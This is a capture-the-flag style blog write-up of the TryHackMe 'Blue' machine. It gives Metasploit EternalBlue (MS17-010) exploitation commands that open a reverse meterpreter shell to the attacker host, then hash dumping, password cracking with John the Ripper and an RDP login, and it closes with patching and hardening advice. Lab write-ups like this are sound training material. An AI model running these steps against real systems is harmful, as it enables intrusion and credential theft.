---
title: "[WriteUp] - Blue (TryHackMe)"
excerpt: "EternalBlue Machine, MS17-010, RCE Vulnerability "
date: "Mar 27 2025"
cover_image: "/blog/blue-thm.webp"
alt: "Writeup 1"
tags1: "Hacking"
tags2: "Windows"
---

# Machine: Blue (TryHackMe)

&nbsp;

> *Difficulty Level: ⭐*

&nbsp;

Blue is a machine with a vulnerability in the SMB 445 protocol. EternalBlue allows remote code execution that was discovered in [MS17-010]

Summary:

* Port scanning
* Vulnerability exploitation (MS17-010 / EternalBlue)
* Remote Shell
* Privilege escalation to NT AUTHORITY\SYSTEM
* Password hash dumping using Hashdump
* Hash cracking with John the Ripper
* Flag searching

**At the end of the report I will give you a summary of the entire machine, in English and Spanish 🥳.**

**IMPORTANT** You must have a virtual machine or an auditing operating system with root privileges and an Internet connection.

## Methodology

* Reconnaissance
* Enumeration
* Vulnerability search and analysis
* Exploitation
* Post-exploitation

**Reconnaissance**: Answers the questions What will be attacked? and What will be part of the test?

**Enumeration**: All possible information about what will be attacked is collected to carry out the test without setbacks

**Vulnerability search and analysis**: Identifies weaknesses in what will be attacked, ports, processes, services among others.

**Exploitation**: Here the attack begins using all the above and with the correct tools.

**Post-exploitation**: Possible extra vulnerabilities or what else can be attacked are sought.

**Test report**: Everything that is done during the audit is written down.

## What is EternalBlue?

Eternal Blue is an exploit that was supposedly developed by the United States National Security Agency (NSA).
This program was stolen and then leaked by "The Shadow Brokers". It was then used to execute one of the most damaging ransomware attacks in history, known as Wannacry.
The eternal blue virus program was designed to exploit a vulnerability registered as *CVE-2017-0144*, which corresponds to a security flaw in Microsoft's Server Message Block (SMB) protocol.
The security patch for this eternal blue virus vulnerability, called *MS17-010*, was released in March 2017.
The use of the eternal blue exploit mainly affected hospitals, police stations, and, in general, organizations around the world.

[Versions with MS17-010](https://support.microsoft.com/es-es/topic/c%C3%B3mo-comprobar-que-ms17-010-est%C3%A1-instalado-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)
[CVE Versions](https://success.trendmicro.com/en-US/solution/KA-0008859)

&nbsp;

## Reconnaissance - Port scanning

Let's start with the reconnaissance phase.
Our IP is *10.8.42.68* and the target is *10.10.90.82*.

```powershell
ping -c 4 10.10.90.82
```

We verify that the destination has ICMP requests enabled.

```powershell
sudo su
```

```powershell
nmap 10.10.90.82 -p- -sV -oN all_ports.nmap -Pn --min-rate 5000
```

Windows usually uses a default TTL value between 126 and 128. Linux and Unix-like systems usually opt for a default TTL value between 62 and 64.

Therefore, we infer that we are facing a machine with Windows as the operating system. Once the above has been identified, we will proceed to perform a port scan using the nmap tool.

Port scanning allows us to identify which services are running within the asset and thus subsequently identify vulnerabilities.

The 445/tcp port for microsoft-ds Windows 7 is open, this is the port through which the vulnerability will be exploited.

&nbsp;

## Enumeration

Using Nmap, the command *nmap 10.10.90.82 -p- -sV -oN all_ports.nmap -Pn --min-rate 5000* is used where the options are:

* *-p-*: Scans all ports (from 1 to 65535).
* *-sV*: Detects service versions on open ports.
* *-oN all_ports.nmap*: Saves the results to a file named all_ports.nmap that can be read later.
* *-Pn*: Skips ping scan and assumes the host is up.
* *--min-rate 5000*: Sets a minimum rate of 5000 packets per second, speeding up the scan (it should be noted that this causes a lot of noise).

![EscaneoBlue.png](https://i.postimg.cc/XYTQptyK/scanblue.png)

We discover that it responds to JON-PC and confirm that it uses Windows 7 as its operating system.

Thanks to this scan we identify the ports:

* **135/tcp (MSRPC)**: Related to the Windows RPC service.
* **139/tcp (NetBIOS-SSN)**: It is used to share files and devices on local networks.
* **445/tcp (SMB)**: Like NetBIOS, it allows sharing files, printers, directories and other resources between devices on a network.
* **3389/tcp (RDP)**: The RDP protocol allows remote connection to computers through a graphical interface. It is essential for remote administration.
* **49152-49160/tcp (dynamic MSRPC)**: These ports are related to dynamic RPC allocation.

&nbsp;

## Vulnerability search and analysis

From all these ports discovered by Nmap we can identify how they can be exploited, for example:

* **135** responds to msrpc which can be exploited by attacks such as **Pass the-Hash** or vulnerabilities in the DCOM service, also found are *CVE-2023-24869*, *CVE-2023-24908*, *CVE-2023-23405* identified in 2023 that allow Remote Code Execution (RCE).
* **139** responds to netbios-ssn which if it contains a misconfig can lead to **Credential enumeration** attacks.
* **445** responds to smb which can be exploited with **EternalBlue** or **SMBGhost** in certain versions. For Linux, *CVE-2025-37899* recently discovered by OpenAI's o3 model was found.
* **3389** responds to rpd, this allows **Brute Force** attacks or vulnerabilities such as **BlueKeep** for Remote Code Execution, also identified is vulnerability *CVE-2022-21990*, which allows **Unauthenticated Connection**.

**It is decided that port 445 will be the one to exploit.**

Port 445 hosts the SMB protocol, this is found on a Windows machine,
we realize that this protocol can be vulnerable using EternalBlue or SMBGhost which respond to CVE-2017-0144 and CVE-2020-0796 both used by the WannaCry and NotPetya ransomware.

### What is Packet crafting?

Packet Crafting is a technique used in cybersecurity where packets are manually created or manipulated to exploit vulnerabilities in a network or system. This method allows customizing network traffic to carry out various malicious activities, such as network reconnaissance, denial of service attacks, or data exfiltration.

Technique that uses the manipulation or creation of TCP/IP packets to bypass security systems or carry out spoofing attacks.

## Exploitation

We start with the attack, already knowing the vulnerability, in this case we will use **Metasploit** with the **EternalBlue** exploit.

Inside metasploit we will search for the EternalBlue vulnerability based on its Rank or Description.

```powershell
msfconsole

> search ms17-010

or 

> search eternalblue

> use exploit/windows/smb/ms17_010_eternalblue

or 

> use 0

> show options
```

Subsequently we will configure the *show options* options, here we are asked for certain mandatory and optional parameters to start the attack.

We proceed to configure the necessary parameters such as the asset IP and the attacking IP and port.

![showoptions](https://i.postimg.cc/k5TQX1FP/shwop.png)

```powershell
> set RHOSTS 10.10.90.82
> set LPORT 65000
> set LHOST 10.8.42.68

> run
```

Once the configuration is complete, we proceed with the execution of the exploit, the objective is to obtain a meterpreter session.

![runBlue](https://i.postimg.cc/wBGz4Cn3/bluaat.png)

The meterpreter session has started, so the exploit worked correctly.
We realize that it is a Windows 7 Professional build 7601, which has been discontinued in updates in January 2020.

We can see the list of commands which have many options that allow us to interact with the asset, one of them is **screenshare**.

![blueHelp](https://i.postimg.cc/L88rdytP/bluehlp.png)

![screenshare](https://i.postimg.cc/XqvwNyQs/scrteen.png)

![screenBlue3](https://i.postimg.cc/sD7pjycd/screen3.png)

So we decided to invoke a remote terminal to be able to interact with the asset.

We realize when executing the whoami command that we are the user **NT/AUTHORITY/SYSTEM**

## What is the NT/AUTHORITY/SYSTEM user?

The NT AUTHORITY\SYSTEM user in Windows is a special account with elevated privileges that allows system services to operate with full access to local resources. It is more powerful than any standard administrator account and is used to run critical system processes.

This account is not associated with a user and is used for tasks such as file management, service execution, and access to protected resources. Similar to the root user in Linux.

Using PowerShell from our machines we can list the services that run under this account:

```powershell
Get-WmiObject win32_service | select Name, StartName | Where-Object {($_.StartName -eq "LocalSystem")} 
```

## Post-Exploitation

Now we are interested in having persistence or finding the hidden flags on the computer, although we can use advanced search tools or create a new user with administrative privileges, we decided to use the existing user on the machine, JON.

Using hashdump we get the list of users hosted on the system with their respective password.

![hashdump](https://i.postimg.cc/02PQgDpY/image.png)

We can use online tools to decrypt the hash but we will use John The Ripper to decrypt passwords and the rockyou.txt dictionary we found that the password for user Jon is: **alqfna22**.

![johntheripper](https://i.postimg.cc/k4PVBZtZ/image.png)

Finally, using the RDP protocol on port 3389 that we observed was open during the enumeration phase, we connect using rdesktop.
Connecting to the Windows machine we realize that it is outdated, since it is an old Windows 7 update and therefore very vulnerable, that is why it was possible to use eternalblue so easily.

![desktop](https://i.postimg.cc/5NytN1Ry/image.png)

We found the evidence (flag3) inside System32/config which is where passwords are saved in Windows 7.

![flag3](https://i.postimg.cc/SNtcymmN/image.png)

## Recommendations

As noted throughout the report, the impact of this vulnerability is critical, therefore it is recommended to follow certain recommendations.

1. Update:
a. Install the security patch that Microsoft has provided MS17-010.
b. Install available Windows Update updates.
2. Disable unnecessary and/or vulnerable protocols:
a. From Programs and Features, “Turn Windows features on or off”, uncheck “SMB 1.0/CIFS File Sharing Support”
b. it can also be disabled from PowerShell using the command: *sc.exe config lanmanworkstation depend=bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start= disabled*
3. Use of Firewall
a. Configure inbound rules only for necessary sources and ports.
4. Disable or secure RDP
a. Disable RDP in favor of “Connections with Network Level Authentication (NLA) only”, From control panel, System, “Remote access settings”.
b. Use strong passwords and 2FA if possible.
5. Use a monitoring tool or SIEM/SOAR.

### Standard

It is recommended to follow the NIST standard, specifically NIST SP 800-53 and NIST SP 800-171.

* NIST SP 800-53: It is a catalog of security controls that cover what is necessary regarding system protection.
    o Limits who can access what (access control).
    o Restricts unnecessary services (attack surface reduction).
    o Ensures system configuration (hardening)
    o Applies patches on time (vulnerability management).
    o Protects and monitors.
    o Documents and responds to incidents
* NIST SP 800-171: Focuses on protecting information in enterprise systems.
    o Strong authentication
    o Secure configurations on computers.

## Sources

* P. José Luis / Madrid, Spain. (n.d.). Packet crafting - GTI - Computer terminology glossary. T U G U R I U M. <https://www.tugurium.com/gti/termino.php?Tr=packet%20crafting>
* What is packet crafting? (2025, May 22). IT Certification Boot Camp Courses | Master IT Certifications Fast – Training Camp. <https://trainingcamp.com/glossary/packet-crafting/>
* <https://nvd.nist.gov/vuln/detail/cve-2017-0144>
* <https://nvd.nist.gov/vuln/detail/CVE-2025-29927>

### Hacking Cybersecurity and Networks Glossary

I recommend reviewing my article on this to better understand the terms in this writeup.

🍁 Glossary of terms [--> Glossary](https://aiskoa.vercel.app/es/blog/glossary)

---

&nbsp;
s
> Thanks for reading my blog, I hope you liked it.

&nbsp;

* 💜 Access to more writeups [--> WriteUps](https://aiskoa.vercel.app/writeup)